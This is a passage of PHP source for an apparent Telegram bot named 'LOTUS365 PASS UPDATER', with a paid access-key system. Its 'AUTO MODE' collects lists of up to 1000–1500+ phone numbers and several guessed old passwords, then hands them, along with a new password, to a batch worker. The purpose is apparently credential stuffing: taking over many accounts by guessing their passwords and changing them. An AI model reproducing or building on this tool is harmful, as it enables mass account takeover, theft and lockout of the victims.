        send_premium($chat_id, [['❌', null], [' CANCELLED.', null]], mainMenuKeyboard($uid));
        return;
    }

    if (preg_match('/^\/start/', $text)) {
        clearState($uid);
        $k = getUserActiveKey($uid);
        $kText = $k ? ($k['key'] . " (" . $k['remaining'] . " LEFT)") : "NO ACTIVE KEY";
        send_premium($chat_id, [
            ['👋', null], [" WELCOME LOTUS365 PASS UPDATER ⚡\n\n", null],
            ["━━━━━━━━━━━━━━━━━━\n", null],
            ['🔑', null], [" KEY STATUS: $kText\n", null],
            ["━━━━━━━━━━━━━━━━━━\n\n", null],
            ['👇', null], [" TAP 'AUTO MODE' TO START", null],
        ], mainMenuKeyboard($uid), false);
        return;
    }

    $state = getState($uid);
    if ($state) {
        $step = $state['step'] ?? '';
        if ($step === 'awaiting_user_key') {
            $res = redeemAccessKey($uid, $text);
            clearState($uid);
            send_premium($chat_id, [[!empty($res['ok']) ? '✅' : '❌', null], [" " . ($res['ok'] ? 'KEY ACTIVATED: ' . $res['entry']['key'] : $res['msg']), null]], mainMenuKeyboard($uid));
            return;
        }
        if ($step === 'awaiting_gen_key' && isAdmin($uid)) {
            $parts = preg_split('/\s+/', trim($text));
            $dur = count($parts) >= 2 ? array_pop($parts) : 'unlimited';
            $pref = implode('', $parts);
            $created = createAccessKey($pref, $dur);
            clearState($uid);
            if (!empty($created['ok'])) {
                send_premium($chat_id, [['✅', null], [" KEY: ", null], [$created['entry']['key'], null, 'code'], [" (" . $created['entry']['duration_label'] . ")", null]], mainMenuKeyboard($uid));
            } else {
                send_premium($chat_id, [['❌', null], [" " . $created['error'], null]], mainMenuKeyboard($uid));
            }
            return;
        }
        if ($step === 'awaiting_del_key' && isAdmin($uid)) {
            $ok = deleteAccessKey($text);
            clearState($uid);
            send_premium($chat_id, [[$ok ? '✅' : '❌', null], [" " . ($ok ? 'DELETED: ' : 'NOT FOUND: '), null], [strtoupper(trim($text)), null, 'code']], mainMenuKeyboard($uid));
            return;
        }
        if ($step === 'awaiting_numbers') {
            $phones = extractPhoneNumbersFromText($text);
            if (empty($phones) && !empty($msg['document']['file_id'])) {
                $phones = extractPhoneNumbersFromFile($msg['document']['file_id']);
            }
            $phones = array_slice($phones, 0, MAX_NUMBERS_PER_RUN);
            if (empty($phones)) {
                send_premium($chat_id, [['❌', null], [' VALID NUMBERS NAHI MILE. LIST YA FILE/PDF BHEJEIN:', null]], cancelKeyboard());
                return;
            }
            setState($uid, ['step' => 'awaiting_old_passwords', 'phones' => $phones]);
            send_premium($chat_id, [
                ['✅', null], [" " . count($phones) . " NUMBERS LOADED\n\n", null],
                [" AB 5-6 OLD PASSWORDS BHEJEIN (HAR LINE MEIN EK YA COMMA SE ALAG):", null],
            ], cancelKeyboard());
            return;
        }
        if ($step === 'awaiting_old_passwords') {
            $oldPasses = [];
            foreach (preg_split('/[\r\n,]+/', $text) as $p) {
                $p = trim($p);
                if ($p !== '' && !in_array($p, $oldPasses, true)) $oldPasses[] = $p;
            }
            if (empty($oldPasses)) {
                send_premium($chat_id, [['❌', null], [' KAM SE KAM 1 OLD PASSWORD BHEJEIN:', null]], cancelKeyboard());
                return;
            }
            setState($uid, [
                'step' => 'awaiting_new_password',
                'phones' => $state['phones'] ?? [],
                'old_passwords' => $oldPasses,
            ]);
            send_premium($chat_id, [
                ['🔑', null], [" " . count($oldPasses) . " OLD PASSWORDS SAVED\n\n", null],
                [" AB NEW PASSWORD BHEJEIN (JIS SE CHANGE KARNA HAI):", null],
            ], cancelKeyboard());
            return;
        }
        if ($step === 'awaiting_new_password') {
            $newPass = trim($text);
            if ($newPass === '') {
                send_premium($chat_id, [['❌', null], [' NEW PASSWORD KHALI NAHI HO SAKTA. DObara BHEJEIN:', null]], cancelKeyboard());
                return;
            }
            $phones = $state['phones'] ?? [];
            $oldPasses = $state['old_passwords'] ?? [];
            clearState($uid);

            if (!spawnPassWorker($uid, $chat_id, $phones, $oldPasses, $newPass)) {
                runPasswordBatchFlow($uid, $chat_id, $phones, $oldPasses, $newPass);
            }
            return;
        }
    }

    if (in_array($text, ['/key', 'ENTER KEY', math_font('ENTER KEY')])) {
        setState($uid, ['step' => 'awaiting_user_key']);
        send_premium($chat_id, [['🔑', null], [' APNI ACCESS KEY BHEJEIN:', null]], cancelKeyboard());
        return;
    }

    if (isAdmin($uid) && in_array($text, ['/genkey', 'GEN KEY', math_font('GEN KEY')])) {
        setState($uid, ['step' => 'awaiting_gen_key']);
        send_premium($chat_id, [['🔑', null], [' FORMAT: L365 24h YA AUTO 1h', null]], cancelKeyboard());
        return;
    }

    if (isAdmin($uid) && in_array($text, ['/keys', 'LIST KEYS', math_font('LIST KEYS')])) {
        $db = getKeysDb();
        $lines = [];
        foreach ($db as $code => $e) {
            $lines[] = "• {$code} (" . ($e['duration_label'] ?? 'UNLIMITED') . ")";
        }
        send_premium($chat_id, [['📋', null], [" KEYS (" . count($lines) . ")\n\n" . (implode("\n", $lines) ?: 'NONE'), null]], mainMenuKeyboard($uid));
        return;
    }

    if (isAdmin($uid) && in_array($text, ['/delkey', 'DEL KEY', math_font('DEL KEY')])) {
        setState($uid, ['step' => 'awaiting_del_key']);
        send_premium($chat_id, [['🗑️', null], [' DELETE KARNE WALI KEY BHEJEIN:', null]], cancelKeyboard());
        return;
    }

    if (!hasValidKey($uid)) {
        send_premium($chat_id, [['🔐', null], [' VALID KEY CHAHIYE. ENTER KEY DABAYEIN.', null]], mainMenuKeyboard($uid));
        return;
    }

    if (in_array($text, ['/auto', 'AUTO MODE', math_font('AUTO MODE')])) {
        setState($uid, ['step' => 'awaiting_numbers']);
        send_premium($chat_id, [
            ['⚙️', null], [" BULK PASSWORD UPDATER\n\n", null],
            [" 1000-1500+ NUMBERS KI LIST (TEXT YA PDF/TXT FILE) BHEJEIN:", null],
        ], cancelKeyboard());
        return;
    }

    send_premium($chat_id, [['👇', null], [' AUTO MODE DABAYEIN.', null]], mainMenuKeyboard($uid));
}
